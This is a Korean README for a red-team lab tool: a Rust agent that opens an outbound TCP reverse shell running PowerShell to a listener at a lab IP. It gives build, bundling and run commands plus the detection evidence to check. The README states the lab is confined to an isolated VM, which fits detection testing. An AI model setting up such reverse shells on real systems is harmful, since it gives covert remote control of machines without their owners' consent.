# Rust + PowerShell 역방향 셸 실습

** 주의 : 절대로 가상 격리망 외에서, 또한 자신을 대상으로 하는 것 외에 사용하지 마십시오. 모든 책임은 사용자에게 있습니다.

승인된 GNS 격리망의 Windows 10 VM과 복구 가능한 스냅샷에서만 사용하는 RED 프로젝트용 실습 코드다. 기존 `rdp-reverse-agent`의 양방향 TCP 중계 원리를 PowerShell 자식 프로세스의 표준 입출력에 적용한다.

```text
RED listener (172.16.21.172:14444)
              ^ outbound TCP
              |
Windows 10 agent -> powershell.exe -NoProfile -NonInteractive
                     stdin/stdout/stderr redirect
```

## 의도적으로 고정한 범위

- 에이전트가 먼저 RED 리스너에 연결한다.
- 리스너는 실행 시 바인드 IP와 포트를 입력받는다. GNS3 안의 가상 공인망을 지원하기 위해 사설/공인 분류로 차단하지 않으며, 유효한 IPv4·IPv6 리터럴과 1~65535 포트를 허용한다.
- 에이전트는 `RED_LAB_LISTENER` 환경 변수에 동일한 `IP:PORT`를 명시해야 하며 기본 고정 주소는 없다.
- 24자 이상의 `RED_LAB_TOKEN`이 일치해야 PowerShell을 시작한다.
- 잘못된 토큰 또는 5초 동안 완료되지 않은 핸드셰이크는 해당 연결만 폐기하고 다시 대기한다.
- 승인된 단일 세션만 처리하며 에이전트는 자동 재연결하지 않는다.
- 명령·stdout·stderr·종료 상태·연결 종료를 request ID가 포함된 길이 지정 프레임으로 구분한다.
- 개별 명령은 최대 120초, 승인된 세션의 유휴 대기는 최대 30분으로 제한한다.
- 일반 사용자 토큰을 그대로 사용한다. 권한상승 기능이 없다.
- 지속성, 서비스·예약 작업 등록, 파일 전송, 자격정보 수집, 난독화, 보안 제품 우회 기능이 없다.
- 리스너는 입력한 명령만 `logs/session-*.log`에 기록한다. 출력은 저장하지 않는다.

토큰과 명령·출력은 암호화되지 않은 TCP로 전달된다. 토큰은 우발적 연결을 막는 실습용 세션 게이트일 뿐이며, 운영 환경의 인증이나 TLS를 대체하지 않는다.

공인 주소처럼 보이는 IP를 입력할 수 있는 이유는 GNS3 내부에서 OSPF와 NAT를 검증하는 가상 공인망을 사용하기 때문이다. 실제 인터넷이나 제3자 시스템 주소를 대상으로 사용하지 않는다.

## 빌드

Rust가 설치된 시스템에서 다음을 실행한다.

```powershell
cd C:\Users\Admin\Desktop\RED\powershell-reverse-lab
cargo build --release --bins
cargo test
```

현재 PC에서 `cargo`가 PATH에 없다면 다음 경로를 사용할 수 있다.

```powershell
& "$env:USERPROFILE\.cargo\bin\cargo.exe" build --release --bins
& "$env:USERPROFILE\.cargo\bin\cargo.exe" test
```

## 권장 배포: 번들 생성

세 실행 파일을 먼저 함께 빌드한다.

```powershell
cargo build --release --bins
.\target\release\packager.exe
```

번들 생성기가 호스트 IP와 포트를 묻는다.

```text
호스트 IP: 172.16.21.172
호스트 포트: 14444
```

실행한 현재 디렉터리 아래에 다음 구조가 생성된다.

```text
dist/session-<세션ID>/
├─ host/
│  ├─ host.exe
│  └─ host.toml
├─ agent/
│  ├─ agent.exe
│  └─ agent.toml
└─ README.txt
```

`host` 폴더 전체를 승인된 리스너 장비에, `agent` 폴더 전체를 Windows 10 VM에 복사한다. TOML 파일을 EXE와 같은 폴더에 유지하면 환경 변수나 추가 입력 없이 설정을 자동으로 읽는다.

```powershell
.\host.exe
.\agent.exe
```

두 TOML 파일에는 동일한 일회용 세션 토큰이 평문으로 들어 있으므로 실제 비밀정보처럼 재사용하지 않고 실습 종료 후 번들 전체를 삭제한다. EXE 자체는 세션마다 다시 컴파일하지 않고 복사하므로 같은 빌드의 해시가 유지된다.

## 수동 실행

먼저 RED 리스너 측에서 충분히 긴 일회용 토큰을 설정하고 실행한다. 바인드 IP와 포트는 실행 후 프롬프트에 입력한다.

```powershell
$env:RED_LAB_TOKEN = "replace-with-a-random-lab-token"
cargo run --bin listener
```

```text
리스너 바인드 IP: 172.16.21.172
리스너 포트: 14444
```

Windows 10 VM에서 같은 값을 설정하고 에이전트를 실행한다.

```powershell
$env:RED_LAB_LISTENER = "172.16.21.172:14444"
$env:RED_LAB_TOKEN = "replace-with-a-random-lab-token"
cargo run --bin agent
```

리스너에서 아래와 같은 비파괴적 명령으로 동작과 권한 문맥을 확인한다.

```powershell
whoami
$PSVersionTable.PSVersion
Get-Date
Get-Process -Id $PID
exit
```

각 명령에는 내부 request ID가 부여되고 프로토콜과 감사 로그에서 stdout·stderr·종료 상태를 구분한다. `exit`과 `.disconnect`는 PowerShell 명령으로 전달하지 않고 리스너에서 세션과 원격 PowerShell을 정상 종료한다.

리스너 화면은 승인된 연결 뒤 원격 PowerShell의 현재 경로를 조회해 일반 PowerShell과 같은 프롬프트를 표시한다. 정상 명령의 request ID와 종료 코드 헤더는 화면에서 생략하지만 감사 로그에는 그대로 남는다. `cd`로 이동한 경로와 PowerShell 변수는 같은 자식 프로세스 안에서 유지된다.

원격 출력은 UTF-8을 우선 사용하고, 유효한 UTF-8이 아닌 Windows PowerShell 표준출력은 Windows-949(CP949) 호환 디코더로 변환한다. 따라서 한국어 Windows의 `오전`·`오후`·`디렉터리` 같은 지역화 출력도 UTF-8 Kali 터미널에서 표시된다.

```text
PS C:\Users\cacti-op> whoami
admin-pc\cacti-op
PS C:\Users\cacti-op> cd Desktop
PS C:\Users\cacti-op\Desktop>
```

## 관찰할 증적

- 프로세스 계보: `agent.exe -> powershell.exe`
- 네트워크: `agent.exe -> 172.16.21.172:14444` 장기 TCP 연결
- Windows Security 4688 또는 Sysmon Event ID 1의 PowerShell 생성
- Sysmon Event ID 3 또는 방화벽·NDR의 아웃바운드 연결
- 정책이 활성화된 경우 PowerShell 4104 Script Block 로그
- 리스너의 `logs/session-*.log` 세션 시작·명령·종료 상태·세션 종료 타임라인

차단되면 통제 성공으로 기록하고, 프로세스·네트워크·PowerShell·SIEM 로그의 수집 여부를 확인한다. 실습이 끝나면 프로세스를 종료한다. 이 코드는 레지스트리, 방화벽, 서비스 또는 예약 작업을 바꾸지 않으므로 별도 상태 복구가 필요하지 않지만, 다른 시나리오 단계와 함께 실행했다면 준비한 Windows 10 VM 스냅샷으로 복원한다.

